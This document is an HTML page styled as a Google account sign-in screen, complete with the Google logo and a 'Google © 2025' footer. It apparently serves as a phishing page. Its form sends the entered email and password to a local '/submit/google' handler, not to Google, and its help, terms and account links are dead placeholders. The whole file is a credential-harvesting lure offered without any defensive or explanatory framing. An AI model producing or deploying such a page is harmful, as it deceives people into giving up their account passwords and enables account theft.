<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Sign in – Google accounts</title>
<style>
body { font-family: Roboto, Arial, sans-serif; background: #f2f2f2; margin: 0; }
.container {
  max-width: 400px;
  margin: 50px auto;
  padding: 20px;
  background: white;
  border-radius: 8px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
  text-align: center;
}
.logo { margin-bottom: 20px; }
.logo svg { width: 75px; height: 75px; }
h2 { font-weight: normal; margin-bottom: 20px; font-size: 24px; }
input[type="email"], input[type="password"], input[type="text"] {
  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
  border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box;
}
button {
  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
  background: #1a73e8; color: white; border: none; border-radius: 4px;
  font-size: 16px; font-weight: bold; cursor: pointer; box-sizing: border-box;
}
button:hover { background: #1558b0; }
a { display: block; margin-top: 15px; color: #1a73e8; text-decoration: none; font-size: 14px; }
a:hover { text-decoration: underline; }
.footer { margin-top: 20px; font-size: 12px; color: #777; }
.footer { margin-top: 20px; font-size: 12px; color: #777; text-align: center; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" width="75" height="75" viewBox="0 0 48 48">
      <path fill="#4285F4" d="M24 9.5c3.54 0 6.7 1.23 9.2 3.25l6.85-6.85C35.9 2.3 30.3 0 24 0 14.6 0 6.6 5.8 2.7 14.1l7.95 6.2C12.3 14.2 17.7 9.5 24 9.5z"/>
      <path fill="#34A853" d="M46.5 24c0-1.6-.15-3.1-.4-4.5H24v9h12.7c-1.1 3-3.2 5.5-6 7.2l7.95 6.2C43.9 37.7 46.5 31.3 46.5 24z"/>
      <path fill="#FBBC05" d="M10.65 28.3c-.5-1.5-.8-3-.8-4.3s.3-2.8.8-4.3l-7.95-6.2C1.3 17.2 0 20.5 0 24s1.3 6.8 3.7 9.5l6.95-5.2z"/>
      <path fill="#EA4335" d="M24 48c6.3 0 11.6-2.1 15.5-5.8l-7.95-6.2c-2.1 1.4-4.8 2.2-7.55 2.2-6.3 0-11.6-4.3-13.5-10.2l-7.95 6.2C6.6 42.2 14.6 48 24 48z"/>
      <path fill="none" d="M0 0h48v48H0z"/>
    </svg>
  </div>
  <h2>Sign in</h2>
  <form method="POST" action="/submit/google">
<input type="email" name="email" placeholder="Email or phone" required autofocus autocomplete="username" style="width:90%;max-width:350px;display:block;margin:10px auto;box-sizing:border-box;" />
<input type="password" name="pass" placeholder="Enter your password" required autocomplete="current-password" />
<button type="submit">Next</button>
  </form>
  <a href="#">Forgot email?</a>
  <a href="#">Create account</a>
  <div style="background:#f7f7f7; padding:10px; font-size:12px; text-align:center; color:#555; margin-top:15px;">
    By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>. This site uses cookies to improve your experience.
  </div>
</div>
<div class="footer">
  Google © 2025
</div>
</body>
</html>
